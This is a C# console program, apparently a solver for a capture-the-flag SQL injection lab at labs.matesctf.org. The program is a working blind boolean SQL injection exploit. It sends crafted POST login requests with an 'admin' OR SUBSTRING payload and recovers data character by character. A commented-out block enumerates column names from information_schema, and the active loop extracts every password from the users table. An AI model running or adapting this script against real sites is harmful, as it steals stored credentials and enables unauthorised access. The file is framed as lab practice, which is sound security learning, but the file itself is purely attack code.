﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Web;
using System.Net;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO;
using System.IO.IsolatedStorage;
using System.Security.Cryptography;

namespace FuzzWebLab3_Blind1
{
    class Program
    {
        static void Main(string[] args)
        {
            String uri = "https://labs.matesctf.org/lab/sqli/1/index.php?page=login";
            System.IO.Stream stream;
            System.IO.StreamReader sr;
            String Out;
            string fuzzString = "";
            int i = 1;


            //fuzzString = "username=admin%27+OR+SUBSTRING%28%28SELECT+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D0x7573657273%29%2C+1%2C+1%29+%3D+%27i%27--+-&password=";
            //for (char a = ' '; a < '~'; a++)
            //{
            //    Cookie ck = new Cookie("ASP.NET_SessionId", "hainhc");
            //    CookieContainer reqCookies = new CookieContainer();
            //    ck.Domain = "labs.matesctf.org";
            //    HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
            //    rq.Method = "POST";
            //    rq.Timeout = 20000;
            //    rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
            //    rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
            //    rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
            //    rq.CookieContainer = reqCookies;
            //    rq.CookieContainer.Add(ck);
            //    fuzzString = "username=admin%27+OR+SUBSTRING%28%28SELECT+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D0x7573657273%29%2C+" + i.ToString() + "%2C+1%29+%3D+%27" + a + "%27--+-&password=";
            //    byte[] data = new System.Text.ASCIIEncoding().GetBytes(fuzzString);
            //    rq.ContentType = "application/x-www-form-urlencoded";
            //    rq.ContentLength = data.Length;
            //    System.IO.Stream postStream = rq.GetRequestStream();
            //    postStream.Write(data, 0, data.Length);
            //    postStream.Close();
            //    HttpWebResponse hr;
            //    hr = (HttpWebResponse)rq.GetResponse();
            //    stream = hr.GetResponseStream();
            //    sr = new System.IO.StreamReader(stream);
            //    Out = sr.ReadToEnd();
            //    if ((Out.IndexOf("<strong>username or password not match</strong>") == -1) && (Out.IndexOf("Internal Server Error") == -1))
            //    {
            //        Console.Write(a);
            //        a = ' ';
            //        i++;
            //    }
            //}

            for (char a = ' '; a < '~'; a++)
            {
                Cookie ck = new Cookie("ASP.NET_SessionId", "hainhc");
                CookieContainer reqCookies = new CookieContainer();
                ck.Domain = "labs.matesctf.org";
                HttpWebRequest rq = (HttpWebRequest)WebRequest.Create(uri);
                rq.Method = "POST";
                rq.Timeout = 20000;
                rq.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
                rq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*";
                rq.Headers.Add("Accept-Language", "vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2");
                rq.CookieContainer = reqCookies;
                rq.CookieContainer.Add(ck);
                fuzzString = "username=admin%27+OR+SUBSTRING%28%28SELECT+group_concat%28password%29+FROM+users%29%2C+" + i.ToString() + "%2C+1%29+%3D+%27" + a + "%27--+-&password=";
                byte[] data = new System.Text.ASCIIEncoding().GetBytes(fuzzString);
                rq.ContentType = "application/x-www-form-urlencoded";
                rq.ContentLength = data.Length;
                System.IO.Stream postStream = rq.GetRequestStream();
                postStream.Write(data, 0, data.Length);
                postStream.Close();
                HttpWebResponse hr;
                hr = (HttpWebResponse)rq.GetResponse();
                stream = hr.GetResponseStream();
                sr = new System.IO.StreamReader(stream);
                Out = sr.ReadToEnd();
                if ((Out.IndexOf("<strong>username or password not match</strong>") == -1) && (Out.IndexOf("Internal Server Error") == -1))
                {
                    Console.Write(a);
                    a = ' ';
                    i++;
                }
            }
            

        }
    }
}
